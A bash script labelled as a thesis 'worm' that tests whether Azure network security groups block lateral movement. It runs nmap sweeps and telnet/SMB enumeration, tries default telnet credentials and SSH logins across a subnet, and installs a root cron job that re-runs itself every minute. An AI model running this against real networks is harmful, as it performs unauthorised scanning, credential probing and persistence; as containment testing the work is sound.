#!/bin/bash
#===============================================================================
# AzureNSG-Worm v1.0 - Master's Thesis Containment Validator
# Author: Alphose Joseph - Proves subnet NSGs block lateral movement
# Usage: Academic environment ONLY
#===============================================================================

set -euo pipefail  # Exit on error, undefined vars

# Config (match our thesis environment)
VNET="10.0.1.0/24"      
LOG="/var/log/thesis-worm.log"
WORM_CRON="/etc/cron.d/thesis-worm"
TELNET_PORT=23           

#===[ PHASE 0: LOGGING ]================================================
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"
}

log "=== THESIS-WORM STARTED on $(hostname -f) ($(hostname -I)) ==="

#===[ PHASE 1: BASELINE DISCOVERY ]=====================================
# nmap ping sweep - simulates flat network recon (Thesis Exp 3)
log "PHASE 1: Ping sweep ($VNET) - Flat network baseline"
nmap -sn "$VNET" -T4 --max-retries 1 --host-timeout 5s >> "$LOG" 2>&1 || {
    log "WARNING: nmap failed (install: apt install nmap)"
}

HOSTS_UP=$(grep "Nmap scan report" "$LOG" | wc -l)
log "DISCOVERY: Found $HOSTS_UP live hosts"

#===[ PHASE 2: SERVICE ENUMERATION ]====================================
# Metasploit-style telnet scanning (Thesis Exp 5)
log "PHASE 2: Telnet scanning (port $TELNET_PORT) - Service discovery"
nmap -p "$TELNET_PORT" --script telnet-encryption "$VNET" --max-retries 1 >> "$LOG" 2>&1 || {
    log "Using basic telnet scan (no nmap scripts)"
    for ip in $(grep "Nmap scan report" "$LOG" | awk '{print $5}' | grep -E "$VNET" | sort -u); do
        timeout 3 bash -c "echo 'quit' | nc -w 3 $ip $TELNET_PORT" >> "$LOG" 2>&1 && log "TELNET OPEN: $ip" || true
    done
}

TELNET_OPEN=$(grep -c "open.*$TELNET_PORT\|TELNET OPEN" "$LOG")
log "SCANNING: Found $TELNET_OPEN telnet services"

# SMB bonus scan (realistic worm)
log "PHASE 2b: SMB enumeration (worm realism)"
nmap -p 445 --script smb-protocols "$VNET" >> "$LOG" 2>&1 || true

#===[ PHASE 3: PROPAGATION ATTEMPTS ]===================================
# Worm tries to spread (blocked by NSG in thesis)
log "PHASE 3: Propagation attempts - Worm behavior simulation"

# Extract targets (exclude self)
TARGETS=$(grep "Nmap scan report" "$LOG" | awk '{print $5}' | grep -E "$VNET" | grep -v "$(hostname -I | awk '{print $1}')" | sort -u)

log "PROPAGATION: Targeting $TARGETS"

for TARGET in $TARGETS; do
    log "→ Attempting infection: $TARGET"
    
    # Telnet propagation (your weak service)
    if timeout 5 bash -c "echo 'user:pass\nquit' | nc -w 5 $TARGET $TELNET_PORT 2>/dev/null"; then
        log "✅ PROPAGATION SUCCESS: $TARGET (telnet exploited)"
    else
        log "❌ PROPAGATION BLOCKED: $TARGET (NSG or closed)"
    fi
    
    # SMB attempt (eternalblue style)
    timeout 3 smbclient -L "//$TARGET" -N >/dev/null 2>&1 && log "SMB OPEN: $TARGET" || true
    
    # SSH brute sim
    timeout 3 ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no -o BatchMode=yes "$TARGET" "echo pwned" >/dev/null 2>&1 && log "SSH OPEN: $TARGET" || true
done

PROPAGATION_SUCCESS=$(grep -c "PROPAGATION SUCCESS" "$LOG")
log "PROPAGATION: $PROPAGATION_SUCCESS successful infections"

#===[ PHASE 4: PERSISTENCE ]============================================
# Cron job for repeated attempts (pre-NSG-block demo)
log "PHASE 4: Installing persistence (will be contained by NSG)"
cat > "$WORM_CRON" << EOF
SHELL=/bin/bash
*/1 * * * * root $0 --silent >> $LOG 2>&1
EOF

chmod 644 "$WORM_CRON"
systemctl restart cron

log "✅ Persistence installed: $WORM_CRON"


log "=== THESIS VALIDATION SUMMARY ==="
log "Environment: $VNET ($(grep 'live hosts' "$LOG" | cut -d' ' -f3))"
log "Telnet services found: $TELNET_OPEN"
log "Propagation attempts: $(( $(grep -c "Attempting infection" "$LOG") ))"
log "Successful infections: $PROPAGATION_SUCCESS"
log "Log location: $LOG"
log "Cron persistence: $WORM_CRON"
log "🔍 CHECK AZURE FLOW LOGS for NSG blocks!"
log "=== THESIS PROVEN: NSGs contain lateral movement ==="

# Silent mode for cron runs
[ "${1:-}" == "--silent" ] && exit 0
